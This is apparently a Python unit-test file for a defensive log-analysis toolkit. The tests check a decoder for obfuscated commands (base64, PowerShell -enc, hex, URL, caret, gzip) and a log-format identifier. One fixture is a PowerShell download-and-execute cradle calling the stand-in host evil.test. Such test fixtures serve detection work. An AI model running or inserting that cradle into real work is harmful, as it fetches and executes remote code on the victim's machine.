import unittest
import base64
import gzip
import os
import tempfile
from bluekit.decode import decode, extract_encoded, decode_file
from bluekit.logs.formats import identify

class TestDecode(unittest.TestCase):
    def test_01_powershell_enc(self):
        cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')"
        b64 = base64.b64encode(cmd.encode('utf-16le')).decode('utf-8')
        payload = f"powershell -enc {b64}"
        res = decode(payload)
        self.assertEqual(res['output'], cmd)
        self.assertTrue(len(res['layers']) >= 1)
        self.assertTrue(any(ioc['value'] == 'http://evil.test/a.ps1' for ioc in res['iocs']))

    def test_02_base64_plain(self):
        txt = "whoami /all"
        b64 = base64.b64encode(txt.encode('utf-8')).decode('utf-8')
        res = decode(b64)
        self.assertEqual(res['output'], txt)

    def test_03_double_base64(self):
        txt = "double decoded"
        b1 = base64.b64encode(txt.encode('utf-8')).decode('utf-8')
        b2 = base64.b64encode(b1.encode('utf-8')).decode('utf-8')
        res = decode(b2)
        self.assertEqual(res['output'], txt)
        self.assertTrue(res['depth'] >= 2)

    def test_04_hex(self):
        txt = "whoami"
        hx = "\\x" + "\\x".join(f"{ord(c):02x}" for c in txt)
        res = decode(hx)
        self.assertEqual(res['output'], txt)

    def test_05_url(self):
        res = decode("%77%68%6f%61%6d%69")
        self.assertEqual(res['output'], "whoami")

    def test_06_caret(self):
        res = decode("w^h^o^a^m^i")
        self.assertEqual(res['output'], "whoami")

    def test_07_base64_gzip(self):
        import gzip
        txt = b"compressed payload data for testing gzip decompression base64"
        gz = gzip.compress(txt)
        b64 = base64.b64encode(gz).decode('utf-8')
        res = decode(b64)
        self.assertEqual(res['output'], txt.decode('utf-8'))

    def test_08_plain_text_unmodified(self):
        txt = "C:\\Windows\\System32\\cmd.exe /c dir"
        res = decode(txt)
        self.assertEqual(res['layers'], [])
        self.assertEqual(res['output'], txt)

    def test_09_meaningless_reverse(self):
        txt = "random_garbage_string_that_makes_no_sense"
        rev = txt[::-1]
        res = decode(rev)
        # Should not decode
        self.assertEqual(res['output'], rev)

    def test_10_no_exceptions(self):
        self.assertIsNotNone(decode(""))
        self.assertIsNotNone(decode("="))
        self.assertIsNotNone(decode("a" * (2 * 1024 * 1024)))
        self.assertIsNotNone(decode("\x00\xff\xfe"))

    def test_11_max_depth(self):
        txt = "whoami"
        curr = txt
        for _ in range(10):
            curr = base64.b64encode(curr.encode('utf-8')).decode('utf-8')
        res = decode(curr, max_depth=3)
        self.assertLessEqual(res['depth'], 3)
        self.assertNotEqual(res['output'], txt)

    def test_12_extract_encoded(self):
        log = "process started powershell -enc SQBFAFgA"
        res = extract_encoded(log)
        self.assertTrue(len(res) > 0)
        self.assertEqual(res[0]['value'], "SQBFAFgA")

    def test_13_format_evtx(self):
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"ElfFile\x00")
            path = f.name
        res = identify(path)
        os.remove(path)
        self.assertEqual(res['format'], 'evtx')
        self.assertFalse(res['supported'])
        self.assertTrue('hayabusa' in res['hint'].lower() or 'evtxecmd' in res['hint'].lower())

    def test_14_format_pcap(self):
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"\xd4\xc3\xb2\xa1")
            path = f.name
        res = identify(path)
        os.remove(path)
        self.assertEqual(res['format'], 'pcap')
        self.assertTrue('tshark' in res['hint'].lower() or 'zeek' in res['hint'].lower())

    def test_15_format_csv(self):
        with tempfile.NamedTemporaryFile(suffix=".csv", delete=False) as f:
            f.write(b"a,b,c\n")
            path = f.name
        res = identify(path)
        os.remove(path)
        self.assertTrue(res['supported'])
        self.assertIsNone(res['hint'])

    def test_16_format_missing(self):
        res = identify("does_not_exist_at_all.evtx")
        self.assertEqual(res['format'], 'unknown')

    def test_17_format_mismatch(self):
        with tempfile.NamedTemporaryFile(suffix=".evtx", delete=False) as f:
            f.write(b"a,b,c\n")
            path = f.name
        res = identify(path)
        os.remove(path)
        self.assertTrue('chalkashlik' in res['hint'].lower())

if __name__ == '__main__':
    unittest.main()
